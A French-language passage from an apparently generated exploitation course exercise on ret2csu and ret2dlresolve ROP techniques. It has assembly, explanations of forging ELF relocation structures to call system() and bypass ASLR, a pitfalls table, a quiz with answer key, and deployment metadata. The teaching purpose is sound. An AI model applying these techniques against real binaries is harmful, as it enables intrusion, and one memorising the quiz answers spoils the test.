Cette fonction est generee par GCC pour initialiser la libc. Elle contient toujours le meme pattern :

```asm
; Boucle d'initialisation
.loop:
    mov    rdx, r14
    mov    rsi, r13
    mov    edi, r12d       ; Note: 32-bit!
    call   [r15 + rbx*8]
    add    rbx, 1
    cmp    rbp, rbx
    jne    .loop

; Cleanup
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    ret
```

**Pourquoi c'est utile :**
1. Permet de controler RDX (rare dans les gadgets normaux)
2. Present dans TOUS les binaires GCC
3. Permet un call indirect (utile pour appeler des fonctions GOT)

#### 5.5.2 ret2dlresolve en profondeur

Le dynamic linker utilise trois structures :
1. **Elf64_Rela** : Ou ecrire et quel symbole resoudre
2. **Elf64_Sym** : Description du symbole
3. **STRTAB** : Nom du symbole en string

En forgeant ces structures, on peut faire resoudre n'importe quelle fonction !

### 5.6 Applications pratiques

1. **Exploitation sans leak** : ret2dlresolve permet de call system() sans connaitre son adresse
2. **Binaires stripes** : ret2csu fonctionne meme sans gadgets classiques
3. **ASLR bypass** : Ces techniques sont independantes des adresses libc

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | RDI tronque a 32-bit | Mauvaise valeur | Verifier < 0xffffffff |
| 2 | rbp != rbx + 1 | Boucle infinie | rbp = 1 quand rbx = 0 |
| 3 | sizeof(Elf64_Rela) = 24 | Mauvais index | Diviser par 24 |
| 4 | r_info shift 32 | Mauvais symbole | (sym << 32) or type |
| 5 | Alignement structures | Crash | Aligner sur 8 bytes |

---

## SECTION 7 : QCM

### Question 1
**Quel registre est limite a 32 bits dans ret2csu ?**

A) RSI via r13
B) RDX via r14
C) RDI via r12
D) RCX
E) R8
F) RAX
G) RBP
H) RSP
I) R15
J) Aucun

**Reponse : C**

---

### Question 2
**Quelle valeur doit avoir rbp pour sortir de la boucle ret2csu apres une iteration (rbx=0) ?**

A) 0
B) 1
C) 2
D) -1
E) 0xffffffff
F) La meme que rbx
G) N'importe quelle valeur
H) L'adresse de retour
I) NULL
J) 0x41414141

**Reponse : B**

---

### Question 3
**Quelle est la taille de la structure Elf64_Rela ?**

A) 8 bytes
B) 12 bytes
C) 16 bytes
D) 24 bytes
E) 32 bytes
F) 48 bytes
G) 64 bytes
H) Variable
I) 20 bytes
J) 28 bytes

**Reponse : D**

---

### Question 4
**Quel type de relocation est utilise pour ret2dlresolve ?**

A) R_X86_64_64
B) R_X86_64_PC32
C) R_X86_64_JUMP_SLOT
D) R_X86_64_GLOB_DAT
E) R_X86_64_RELATIVE
F) R_X86_64_COPY
G) R_X86_64_PLT32
H) R_X86_64_GOT32
I) R_X86_64_NONE
J) R_X86_64_32

**Reponse : C**

---

### Question 5
**Pourquoi ret2dlresolve ne fonctionne pas avec Full RELRO ?**

A) Le PLT n'existe pas
B) Le GOT est en read-only
C) La libc n'est pas chargee
D) ASLR est trop fort
E) Les structures sont chiffrees
F) Le dynamic linker est desactive
G) La stack n'est pas executable
H) Les gadgets sont absents
I) Le binaire est statique
J) NX est active

**Reponse : B**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | 9/10 |
| **Temps estime** | 120 min |
| **XP Base** | 400 |
| **XP Bonus** | x2 (800 total) |
| **Concepts cles** | ret2csu, ret2dlresolve, Elf64_Sym, Elf64_Rela |
| **Langage** | Python 3.12 |
| **Prerequis** | ROP basique, Structures ELF, Dynamic linking |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.4.6-b-universal-gadgets",
    "generated_at": "2026-01-16",

    "metadata": {
      "exercise_id": "3.4.6-b",
      "exercise_name": "universal_gadgets",
      "module": "3.4.6",
      "module_name": "ROP Advanced Techniques",
      "concept": "b",
      "concept_name": "Gadgets Universels (ret2csu, ret2dlresolve)",
      "type": "code",
      "tier": 3,
      "phase": 3,
      "difficulty": 9,
      "language": "python",
      "duration_minutes": 120,
      "xp_base": 400,
      "prerequisites": ["ROP basique", "Structures ELF"],
      "domains": ["Exploit", "ELF", "ROP"],
      "tags": ["ret2csu", "ret2dlresolve", "universal-gadgets"]
    }
  }
}
```
